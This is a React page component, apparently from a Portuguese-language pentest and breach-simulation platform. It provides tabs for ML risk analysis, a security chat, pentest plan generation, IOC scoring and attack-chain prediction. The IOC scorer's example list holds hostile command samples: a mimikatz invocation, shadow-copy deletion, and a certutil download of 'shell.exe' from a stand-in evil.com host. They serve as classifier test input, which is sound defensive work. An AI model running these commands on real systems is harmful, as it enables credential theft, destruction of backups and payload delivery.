import React, { useState, useEffect, useRef } from 'react'
import {
  Brain, MessageSquare, Target, Shield, Zap, AlertTriangle,
  Play, Loader, ChevronDown, ChevronRight, CheckCircle2,
  XCircle, TrendingUp, Search, BarChart3, Network, Activity,
} from 'lucide-react'
import api from '../api'

// ── Status Badge ─────────────────────────────────────────────────────────────
function StatusBadge({ ok, label }) {
  return (
    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold ${
      ok ? 'bg-green-900/40 text-green-400 border border-green-700/50'
         : 'bg-yellow-900/30 text-yellow-400 border border-yellow-700/40'
    }`}>
      {ok ? <CheckCircle2 className="w-3 h-3" /> : <AlertTriangle className="w-3 h-3" />}
      {label}
    </span>
  )
}

// ── Markdown-lite renderer ────────────────────────────────────────────────────
function AIText({ text }) {
  if (!text) return null
  const lines = text.split('\n')
  return (
    <div className="space-y-1.5 text-sm text-gray-300 leading-relaxed">
      {lines.map((line, i) => {
        if (line.startsWith('**') && line.endsWith('**'))
          return <p key={i} className="font-semibold text-gray-100 mt-3 first:mt-0">{line.slice(2, -2)}</p>
        if (/^\*\*.*\*\*/.test(line)) {
          const parts = line.split(/(\*\*.*?\*\*)/)
          return (
            <p key={i}>
              {parts.map((p, j) =>
                p.startsWith('**') && p.endsWith('**')
                  ? <strong key={j} className="text-gray-100">{p.slice(2, -2)}</strong>
                  : p
              )}
            </p>
          )
        }
        if (/^(\d+\.|•|-)\s/.test(line))
          return <p key={i} className="pl-4 text-gray-300">{line}</p>
        if (line.trim() === '') return <div key={i} className="h-1" />
        return <p key={i}>{line}</p>
      })}
    </div>
  )
}

// ── Metric card ───────────────────────────────────────────────────────────────
function Metric({ label, value, sub, color = 'text-gray-100' }) {
  return (
    <div className="card-dark p-4 space-y-1">
      <p className="text-xs text-gray-500 font-medium">{label}</p>
      <p className={`text-2xl font-bold ${color}`}>{value}</p>
      {sub && <p className="text-xs text-gray-600">{sub}</p>}
    </div>
  )
}

// ── Tab ───────────────────────────────────────────────────────────────────────
function Tab({ active, onClick, icon: Icon, label }) {
  return (
    <button
      onClick={onClick}
      className={`flex items-center gap-2 px-4 py-2.5 text-sm font-medium rounded-lg transition ${
        active
          ? 'bg-red-900/40 text-red-400 border border-red-800/40'
          : 'text-gray-400 hover:text-gray-200 hover:bg-dark-700'
      }`}
    >
      <Icon className="w-4 h-4" />
      <span className="hidden sm:inline">{label}</span>
    </button>
  )
}

// ── Chain Map ─────────────────────────────────────────────────────────────────
function ChainMapViz({ chain }) {
  if (!chain?.length) return null
  return (
    <div className="overflow-x-auto">
      <div className="flex gap-2 min-w-max pb-2">
        {chain.map((node, i) => (
          <React.Fragment key={node.tactic}>
            <div className={`rounded-lg px-3 py-2 text-xs text-center min-w-[90px] border ${
              node.tested
                ? 'bg-red-900/40 border-red-700/60 text-red-300'
                : 'bg-dark-700 border-dark-600 text-gray-500'
            }`}>
              <p className="font-bold">{node.tactic.replace(' ', '\n')}</p>
              <p className="text-[10px] mt-1 opacity-70">risco {Math.round(node.weight * 100)}%</p>
              {node.tested && <p className="text-[10px] text-red-400 mt-0.5">✓ testado</p>}
            </div>
            {i < chain.length - 1 && (
              <div className="flex items-center text-gray-700">›</div>
            )}
          </React.Fragment>
        ))}
      </div>
    </div>
  )
}

// ════════════════════════════════════════════════════════════════════════════════

export default function AI() {
  const [tab, setTab] = useState('analyze')
  const [aiStatus, setAiStatus] = useState(null)
  const [sims, setSims] = useState([])

  useEffect(() => {
    api.get('/api/ai/status').then(r => setAiStatus(r.data)).catch(() => {})
    api.get('/api/bas/simulations').then(r => setSims(r.data.simulations || [])).catch(() => {})
  }, [])

  const mlOk  = aiStatus?.ml?.available
  const llmOk = aiStatus?.llm?.available
  const demoMode = !llmOk

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold text-gray-100 flex items-center gap-3">
            <Brain className="w-7 h-7 text-red-400" />
            IA &amp; Machine Learning
          </h1>
          <p className="text-gray-500 text-sm mt-1">
            Análise de risco, chat de segurança, predição de técnicas e scoring de IOCs.
          </p>
        </div>
        {aiStatus && (
          <div className="flex flex-wrap gap-2">
            <StatusBadge ok={mlOk} label={mlOk ? `ML ativo (${aiStatus.ml?.simulations_trained || 0} treinos)` : 'ML inicializando'} />
            <StatusBadge ok={llmOk} label={llmOk ? `LLM: ${aiStatus.llm?.model}` : 'Modo demo (sem LLM)'} />
          </div>
        )}
      </div>

      {/* Demo notice */}
      {demoMode && (
        <div className="bg-blue-900/20 border border-blue-700/40 rounded-xl p-4 flex gap-3">
          <Brain className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
          <div className="text-sm space-y-1">
            <p className="text-blue-300 font-semibold">Motor ML ativo — LLM opcional</p>
            <p className="text-blue-400/80">
              O módulo de ML (scikit-learn) funciona sem LLM. Para análises narrativas por IA,
              defina <code className="bg-dark-700 px-1 rounded text-xs">PENTEIA_AI_MODEL=/caminho/modelo.gguf</code> e reinicie.
            </p>
            {aiStatus?.recommended_models && (
              <div className="mt-2 flex flex-wrap gap-2">
                {aiStatus.recommended_models.map(m => (
                  <span key={m.name} className="text-[11px] bg-dark-700 text-gray-400 px-2 py-0.5 rounded font-mono">
                    {m.name} ({m.size_gb}GB)
                  </span>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Tabs */}
      <div className="flex flex-wrap gap-2">
        <Tab active={tab === 'analyze'} onClick={() => setTab('analyze')} icon={BarChart3} label="Analisar Simulação" />
        <Tab active={tab === 'chat'}    onClick={() => setTab('chat')}    icon={MessageSquare} label="Chat IA" />
        <Tab active={tab === 'plan'}    onClick={() => setTab('plan')}    icon={Target}  label="Plano de Pentest" />
        <Tab active={tab === 'ioc'}     onClick={() => setTab('ioc')}     icon={Search}  label="Scoring de IOCs" />
        <Tab active={tab === 'chain'}   onClick={() => setTab('chain')}   icon={Network} label="Cadeia de Ataque" />
      </div>

      {/* Panels */}
      {tab === 'analyze' && <AnalyzePanel sims={sims} />}
      {tab === 'chat'    && <ChatPanel />}
      {tab === 'plan'    && <PlanPanel />}
      {tab === 'ioc'     && <IOCPanel />}
      {tab === 'chain'   && <ChainPanel sims={sims} />}
    </div>
  )
}


// ── Analyze Panel ─────────────────────────────────────────────────────────────
function AnalyzePanel({ sims }) {
  const [simId, setSimId] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState('')

  const run = async () => {
    if (!simId) return
    setLoading(true); setError(''); setResult(null)
    try {
      const r = await api.post('/api/ai/analyze', { simulation_id: simId })
      setResult(r.data)
    } catch (e) { setError(e.response?.data?.detail || 'Erro na análise') }
    finally { setLoading(false) }
  }

  const done = sims.filter(s => s.status === 'completed')

  return (
    <div className="space-y-4">
      <div className="card-dark p-5 space-y-4">
        <h2 className="font-semibold text-gray-200 flex items-center gap-2">
          <BarChart3 className="w-4 h-4 text-red-400" /> Análise de Simulação BAS por ML
        </h2>
        <div className="flex gap-3">
          <select
            className="select-dark flex-1"
            value={simId}
            onChange={e => setSimId(e.target.value)}
          >
            <option value="">— selecione uma simulação —</option>
            {done.map(s => (
              <option key={s.id} value={s.id}>
                {s.target} — score {s.score?.toFixed(0)}% ({s.created_at?.slice(0, 10)})
              </option>
            ))}
          </select>
          <button
            onClick={run}
            disabled={!simId || loading}
            className="flex items-center gap-2 px-4 py-2 bg-red-700 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition disabled:opacity-50"
          >
            {loading ? <Loader className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
            Analisar
          </button>
        </div>
        {error && <p className="text-red-400 text-sm">{error}</p>}
      </div>

      {result && (
        <div className="space-y-4">
          {/* ML Scores */}
          {result.ml && (
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
              <Metric
                label="Score ML"
                value={`${result.ml.ml_risk_score?.toFixed(0)}%`}
                sub="rede feedforward"
                color={result.ml.ml_risk_score >= 70 ? 'text-red-400' : result.ml.ml_risk_score >= 40 ? 'text-orange-400' : 'text-green-400'}
              />
              <Metric
                label="Score Combinado"
                value={`${result.ml.blended_score?.toFixed(0)}%`}
                sub="ML 55% + heurístico 45%"
              />
              <Metric
                label="Anomalia"
                value={result.ml.anomaly?.is_anomaly ? '⚠ Sim' : '✓ Normal'}
                sub={`confiança: ${result.ml.anomaly?.confidence || '?'}`}
                color={result.ml.anomaly?.is_anomaly ? 'text-yellow-400' : 'text-green-400'}
              />
              <Metric
                label="Treinos"
                value={result.ml.simulations_trained}
                sub="simulações processadas"
              />
            </div>
          )}

          {/* Narrative */}
          {result.narrative && (
            <div className="card-dark p-5">
              <h3 className="text-sm font-semibold text-gray-400 mb-3 flex items-center gap-2">
                <Brain className="w-4 h-4 text-red-400" /> Análise Narrativa
              </h3>
              <AIText text={result.narrative} />
            </div>
          )}

          {/* Top features */}
          {result.ml?.top_features?.length > 0 && (
            <div className="card-dark p-5">
              <h3 className="text-sm font-semibold text-gray-400 mb-3 flex items-center gap-2">
                <Activity className="w-4 h-4 text-red-400" /> Principais Fatores de Risco (ML)
              </h3>
              <div className="space-y-2">
                {result.ml.top_features.map(([name, val]) => (
                  <div key={name} className="flex items-center gap-3">
                    <span className="text-xs text-gray-500 w-36 shrink-0 font-mono">{name}</span>
                    <div className="flex-1 bg-dark-700 rounded-full h-2">
                      <div
                        className="bg-red-600 h-2 rounded-full transition-all"
                        style={{ width: `${Math.min(val, 100)}%` }}
                      />
                    </div>
                    <span className="text-xs text-gray-400 w-10 text-right">{val.toFixed(0)}%</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Recommendations */}
          {result.ml?.recommendations?.length > 0 && (
            <div className="card-dark p-5">
              <h3 className="text-sm font-semibold text-gray-400 mb-3 flex items-center gap-2">
                <TrendingUp className="w-4 h-4 text-red-400" /> Próximas Técnicas Recomendadas (ML)
              </h3>
              <div className="space-y-2">
                {result.ml.recommendations.slice(0, 6).map(r => (
                  <div key={r.technique_id} className="flex items-center gap-3 p-3 bg-dark-700 rounded-lg">
                    <div className="text-center w-14 shrink-0">
                      <div className={`text-lg font-bold ${r.priority_score >= 70 ? 'text-red-400' : r.priority_score >= 50 ? 'text-orange-400' : 'text-yellow-400'}`}>
                        {r.priority_score.toFixed(0)}
                      </div>
                      <div className="text-[10px] text-gray-600">score</div>
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-gray-200 font-mono">{r.technique_id}</p>
                      <p className="text-xs text-gray-400 truncate">{r.technique_name}</p>
                      <p className="text-xs text-gray-600">{r.tactic}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Attack Chain */}
          {result.ml?.attack_chain_map && (
            <div className="card-dark p-5">
              <h3 className="text-sm font-semibold text-gray-400 mb-3 flex items-center gap-2">
                <Network className="w-4 h-4 text-red-400" /> Cadeia de Ataque
              </h3>
              <ChainMapViz chain={result.ml.attack_chain_map} />
            </div>
          )}
        </div>
      )}
    </div>
  )
}


// ── Chat Panel ────────────────────────────────────────────────────────────────
function ChatPanel() {
  const [messages, setMessages] = useState([
    {
      role: 'assistant',
      text: 'Olá! Sou o PenteIA Assistant. Posso responder perguntas técnicas sobre segurança ofensiva, MITRE ATT&CK, remediação, Wazuh, SOC e red team. Como posso ajudar?',
    },
  ])
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const bottomRef = useRef(null)

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [messages])

  const send = async () => {
    const q = input.trim()
    if (!q || loading) return
    setInput('')
    setMessages(m => [...m, { role: 'user', text: q }])
    setLoading(true)
    try {
      const r = await api.post('/api/ai/chat', { question: q })
      setMessages(m => [...m, { role: 'assistant', text: r.data.answer }])
    } catch {
      setMessages(m => [...m, { role: 'assistant', text: 'Erro ao processar sua pergunta. Tente novamente.' }])
    } finally {
      setLoading(false)
    }
  }

  const SUGGESTIONS = [
    'Como funciona o Pass-the-Hash?',
    'Quais técnicas de lateral movement testar?',
    'Como melhorar a cobertura de detecção no Wazuh?',
    'O que é Kerberoasting e como mitigar?',
  ]

  return (
    <div className="card-dark flex flex-col" style={{ height: '70vh' }}>
      <div className="flex-1 overflow-y-auto p-5 space-y-4">
        {messages.map((m, i) => (
          <div key={i} className={`flex gap-3 ${m.role === 'user' ? 'flex-row-reverse' : ''}`}>
            <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${
              m.role === 'user' ? 'bg-red-900/40 text-red-400' : 'bg-dark-700 text-red-400'
            }`}>
              {m.role === 'user' ? '👤' : <Brain className="w-4 h-4" />}
            </div>
            <div className={`max-w-[80%] rounded-xl px-4 py-3 ${
              m.role === 'user'
                ? 'bg-red-900/30 text-gray-200 text-sm'
                : 'bg-dark-700 border border-dark-600'
            }`}>
              {m.role === 'assistant' ? <AIText text={m.text} /> : <p className="text-sm">{m.text}</p>}
            </div>
          </div>
        ))}
        {loading && (
          <div className="flex gap-3">
            <div className="w-8 h-8 rounded-lg bg-dark-700 flex items-center justify-center">
              <Brain className="w-4 h-4 text-red-400" />
            </div>
            <div className="bg-dark-700 rounded-xl px-4 py-3 flex items-center gap-2 text-gray-500 text-sm">
              <Loader className="w-3 h-3 animate-spin" /> Processando...
            </div>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {messages.length <= 1 && (
        <div className="px-5 pb-3 flex flex-wrap gap-2">
          {SUGGESTIONS.map(s => (
            <button
              key={s}
              onClick={() => { setInput(s); }}
              className="text-xs px-3 py-1.5 bg-dark-700 hover:bg-dark-600 text-gray-400 hover:text-gray-200 rounded-full transition"
            >
              {s}
            </button>
          ))}
        </div>
      )}

      <div className="border-t border-dark-600 p-4 flex gap-3">
        <input
          className="input-dark flex-1 text-sm"
          placeholder="Pergunte sobre MITRE, Wazuh, remediação, red team..."
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send() } }}
          disabled={loading}
        />
        <button
          onClick={send}
          disabled={!input.trim() || loading}
          className="px-4 py-2 bg-red-700 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition disabled:opacity-50"
        >
          {loading ? <Loader className="w-4 h-4 animate-spin" /> : 'Enviar'}
        </button>
      </div>
    </div>
  )
}


// ── Plan Panel ────────────────────────────────────────────────────────────────
function PlanPanel() {
  const [form, setForm] = useState({ target: '', scope: '', technologies: '', duration: '5 dias', objective: 'full' })
  const [loading, setLoading] = useState(false)
  const [plan, setPlan] = useState('')
  const [error, setError] = useState('')

  const run = async () => {
    setLoading(true); setError(''); setPlan('')
    try {
      const r = await api.post('/api/ai/pentest-plan', form)
      setPlan(r.data.plan)
    } catch (e) { setError(e.response?.data?.detail || 'Erro') }
    finally { setLoading(false) }
  }

  return (
    <div className="space-y-4">
      <div className="card-dark p-5 space-y-4">
        <h2 className="font-semibold text-gray-200 flex items-center gap-2">
          <Target className="w-4 h-4 text-red-400" /> Gerador de Plano de Pentest (IA)
        </h2>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          {[
            { key: 'target', label: 'Alvo', placeholder: 'empresa.com ou 192.168.1.0/24' },
            { key: 'scope', label: 'Escopo', placeholder: 'rede interna + aplicações web' },
            { key: 'technologies', label: 'Tecnologias', placeholder: 'Windows AD, Linux, Spring Boot' },
            { key: 'duration', label: 'Duração', placeholder: '5 dias' },
          ].map(f => (
            <div key={f.key}>
              <label className="block text-xs font-medium text-gray-400 mb-1">{f.label}</label>
              <input
                className="input-dark w-full text-sm"
                placeholder={f.placeholder}
                value={form[f.key]}
                onChange={e => setForm(p => ({ ...p, [f.key]: e.target.value }))}
              />
            </div>
          ))}
          <div>
            <label className="block text-xs font-medium text-gray-400 mb-1">Objetivo</label>
            <select
              className="select-dark w-full"
              value={form.objective}
              onChange={e => setForm(p => ({ ...p, objective: e.target.value }))}
            >
              <option value="full">Full Red Team</option>
              <option value="web">Aplicações Web</option>
              <option value="internal">Rede Interna / AD</option>
              <option value="cloud">Cloud Security</option>
              <option value="phishing">Engenharia Social</option>
            </select>
          </div>
        </div>
        <button
          onClick={run}
          disabled={loading}
          className="flex items-center gap-2 px-4 py-2 bg-red-700 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition disabled:opacity-50"
        >
          {loading ? <Loader className="w-4 h-4 animate-spin" /> : <Zap className="w-4 h-4" />}
          {loading ? 'Gerando...' : 'Gerar Plano'}
        </button>
        {error && <p className="text-red-400 text-sm">{error}</p>}
      </div>
      {plan && (
        <div className="card-dark p-5">
          <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2">
            <Target className="w-4 h-4 text-red-400" /> Plano Gerado pela IA
          </h3>
          <AIText text={plan} />
        </div>
      )}
    </div>
  )
}


// ── IOC Panel ─────────────────────────────────────────────────────────────────
function IOCPanel() {
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState('')

  const run = async () => {
    const texts = input.split('\n').map(s => s.trim()).filter(Boolean)
    if (!texts.length) return
    setLoading(true); setError(''); setResult(null)
    try {
      const r = await api.post('/api/ai/score-iocs', { texts })
      setResult(r.data)
    } catch (e) { setError(e.response?.data?.detail || 'Erro') }
    finally { setLoading(false) }
  }

  const EXAMPLES = [
    'mimikatz.exe -privilege::debug',
    'powershell.exe -EncodedCommand JAB...',
    'vssadmin delete shadows /all /quiet',
    'certutil -urlcache -split -f http://evil.com/shell.exe',
    'ping google.com',
    'ls /home/user',
  ]

  const scoreColor = (s) =>
    s >= 60 ? 'text-red-400' : s >= 30 ? 'text-yellow-400' : 'text-green-400'

  return (
    <div className="space-y-4">
      <div className="card-dark p-5 space-y-4">
        <h2 className="font-semibold text-gray-200 flex items-center gap-2">
          <Search className="w-4 h-4 text-red-400" /> Scoring de IOCs / Comandos (ML)
        </h2>
        <p className="text-xs text-gray-500">
          Cole comandos, strings suspeitas ou IOCs (um por linha). O modelo ML classifica a maliciosidade de cada item.
        </p>
        <div>
          <div className="flex items-center justify-between mb-1">
            <label className="text-xs font-medium text-gray-400">IOCs / Comandos</label>
            <button
              onClick={() => setInput(EXAMPLES.join('\n'))}
              className="text-xs text-gray-600 hover:text-gray-400 transition"
            >
              carregar exemplos
            </button>
          </div>
          <textarea
            className="input-dark w-full text-sm font-mono"
            rows={7}
            placeholder="mimikatz.exe&#10;powershell -enc JAB...&#10;vssadmin delete shadows"
            value={input}
            onChange={e => setInput(e.target.value)}
          />
        </div>
        <button
          onClick={run}
          disabled={!input.trim() || loading}
          className="flex items-center gap-2 px-4 py-2 bg-red-700 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition disabled:opacity-50"
        >
          {loading ? <Loader className="w-4 h-4 animate-spin" /> : <Shield className="w-4 h-4" />}
          {loading ? 'Classificando...' : 'Classificar IOCs'}
        </button>
        {error && <p className="text-red-400 text-sm">{error}</p>}
      </div>

      {result && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <Metric label="Score Médio" value={`${result.average_score?.toFixed(0)}%`} color={scoreColor(result.average_score)} />
            <Metric label="Alto Risco" value={result.high_risk_count} sub="score ≥ 60%" color="text-red-400" />
            <Metric label="Total" value={result.total} sub="IOCs analisados" />
            <Metric label="Veredicto" value={result.verdict} />
          </div>

          <div className="card-dark p-5">
            <h3 className="text-sm font-semibold text-gray-400 mb-3">Resultados por Item</h3>
            <div className="space-y-2">
              {result.results?.map((r, i) => (
                <div key={i} className="flex items-center gap-3 p-3 bg-dark-700 rounded-lg">
                  <div className={`text-lg font-bold w-12 text-center shrink-0 ${scoreColor(r.score)}`}>
                    {r.score.toFixed(0)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-mono text-gray-300 truncate">{r.text}</p>
                    {r.matched_indicators?.length > 0 && (
                      <div className="flex flex-wrap gap-1 mt-1">
                        {r.matched_indicators.map(m => (
                          <span key={m} className="text-[10px] bg-red-900/30 text-red-400 px-1.5 py-0.5 rounded">{m}</span>
                        ))}
                      </div>
                    )}
                  </div>
                  <span className={`text-xs font-semibold px-2 py-0.5 rounded shrink-0 ${
                    r.verdict === 'malicioso' ? 'bg-red-900/50 text-red-400' :
                    r.verdict === 'suspeito'  ? 'bg-yellow-900/50 text-yellow-400' :
                    'bg-green-900/40 text-green-400'
                  }`}>{r.verdict}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}


// Fallback tático client-side para técnicas legadas sem campo tactic
const _TECH_TACTIC_FALLBACK = {
  T1590: 'Reconnaissance', T1592: 'Reconnaissance', T1595: 'Reconnaissance',
  T1591: 'Reconnaissance', T1589: 'Reconnaissance', T1596: 'Reconnaissance',
  T1598: 'Reconnaissance', T1593: 'Reconnaissance',
  T1190: 'Initial Access', T1133: 'Initial Access', T1566: 'Initial Access',
  T1078: 'Credential Access', T1110: 'Credential Access', T1558: 'Credential Access',
  T1059: 'Execution', T1203: 'Execution',
  T1543: 'Persistence', T1053: 'Persistence',
  T1548: 'Privilege Escalation', T1134: 'Privilege Escalation', T1068: 'Privilege Escalation',
  T1070: 'Defense Evasion', T1218: 'Defense Evasion', T1562: 'Defense Evasion',
  T1046: 'Discovery', T1083: 'Discovery', T1087: 'Discovery', T1069: 'Discovery',
  T1021: 'Lateral Movement', T1550: 'Lateral Movement',
  T1005: 'Collection', T1557: 'Collection', T1185: 'Collection',
  T1602: 'Defense Evasion',
  T1499: 'Impact', T1486: 'Impact', T1490: 'Impact', T1489: 'Impact',
  T1071: 'Command and Control', T1090: 'Command and Control',
  T1041: 'Exfiltration', T1567: 'Exfiltration',
}

function _lookupTactic(tid) {
  if (!tid) return null
  const base = tid.replace(/[a-e]$/i, '')
  return _TECH_TACTIC_FALLBACK[tid] || _TECH_TACTIC_FALLBACK[base] || null
}

// ── Chain Panel ───────────────────────────────────────────────────────────────
function ChainPanel({ sims }) {
  const [tactics, setTactics] = useState([])
  const [tested, setTested] = useState([])
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [simId, setSimId] = useState('')

  const ALL_TACTICS = [
    'Initial Access','Execution','Persistence','Privilege Escalation',
    'Defense Evasion','Credential Access','Discovery','Lateral Movement',
    'Collection','Command and Control','Exfiltration','Impact',
  ]

  const loadFromSim = (id) => {
    setSimId(id)
    if (!id) return
    const s = sims.find(s => s.id === id)
    if (s) {
      const techs = s.results?.techniques || []
      const foundTactics = [...new Set(
        techs
          .filter(t => t.status === 'found')
          .map(t => t.tactic || _lookupTactic(t.id))
          .filter(Boolean)
      )]
      const testedIds = techs.map(t => t.id).filter(Boolean)
      setTactics(foundTactics)
      setTested(testedIds)
    }
  }

  const run = async () => {
    setLoading(true); setResult(null)
    try {
      const r = await api.post('/api/ai/next-techniques', { found_tactics: tactics, tested_ids: tested })
      setResult(r.data)
    } catch {}
    finally { setLoading(false) }
  }

  const done = sims.filter(s => s.status === 'completed')

  return (
    <div className="space-y-4">
      <div className="card-dark p-5 space-y-4">
        <h2 className="font-semibold text-gray-200 flex items-center gap-2">
          <Network className="w-4 h-4 text-red-400" /> Predição de Cadeia de Ataque (ML)
        </h2>
        <p className="text-xs text-gray-500">
          O modelo ML analisa as táticas já descobertas e prediz as próximas técnicas mais prováveis no caminho de ataque.
        </p>

        <div>
          <label className="text-xs font-medium text-gray-400 mb-2 block">Carregar de simulação (opcional)</label>
          <select
            className="select-dark w-full"
            value={simId}
            onChange={e => loadFromSim(e.target.value)}
          >
            <option value="">— ou selecione manualmente abaixo —</option>
            {done.map(s => <option key={s.id} value={s.id}>{s.target} ({s.created_at?.slice(0, 10)})</option>)}
          </select>
        </div>

        <div>
          <label className="text-xs font-medium text-gray-400 mb-2 block">Táticas já descobertas</label>
          <div className="flex flex-wrap gap-2">
            {ALL_TACTICS.map(t => (
              <button
                key={t}
                onClick={() => setTactics(p => p.includes(t) ? p.filter(x => x !== t) : [...p, t])}
                className={`text-xs px-2.5 py-1 rounded-full border transition ${
                  tactics.includes(t)
                    ? 'bg-red-900/40 text-red-400 border-red-700/60'
                    : 'bg-dark-700 text-gray-500 border-dark-600 hover:border-dark-500'
                }`}
              >
                {t}
              </button>
            ))}
          </div>
        </div>

        <button
          onClick={run}
          disabled={tactics.length === 0 || loading}
          className="flex items-center gap-2 px-4 py-2 bg-red-700 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition disabled:opacity-50"
        >
          {loading ? <Loader className="w-4 h-4 animate-spin" /> : <TrendingUp className="w-4 h-4" />}
          {loading ? 'Calculando...' : 'Predizer Próximas Técnicas'}
        </button>
      </div>

      {result && (
        <div className="space-y-4">
          <div className="card-dark p-5">
            <h3 className="text-sm font-semibold text-gray-400 mb-3 flex items-center gap-2">
              <Network className="w-4 h-4 text-red-400" /> Mapa da Cadeia de Ataque
            </h3>
            <ChainMapViz chain={result.attack_chain} />
          </div>

          {result.recommendations?.length > 0 && (
            <div className="card-dark p-5">
              <h3 className="text-sm font-semibold text-gray-400 mb-3 flex items-center gap-2">
                <TrendingUp className="w-4 h-4 text-red-400" /> Próximas Técnicas Prioritárias
              </h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                {result.recommendations.slice(0, 8).map(r => (
                  <div key={r.technique_id} className="p-3 bg-dark-700 rounded-lg border border-dark-600">
                    <div className="flex items-start justify-between gap-2">
                      <div className="min-w-0">
                        <p className="text-sm font-mono text-gray-200 font-medium">{r.technique_id}</p>
                        <p className="text-xs text-gray-400 mt-0.5">{r.technique_name}</p>
                        <p className="text-xs text-gray-600 mt-1">{r.tactic}</p>
                      </div>
                      <div className={`text-xl font-bold shrink-0 ${
                        r.priority_score >= 70 ? 'text-red-400' :
                        r.priority_score >= 50 ? 'text-orange-400' : 'text-yellow-400'
                      }`}>{r.priority_score.toFixed(0)}</div>
                    </div>
                    <p className="text-[11px] text-gray-600 mt-2">{r.reason}</p>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  )
}
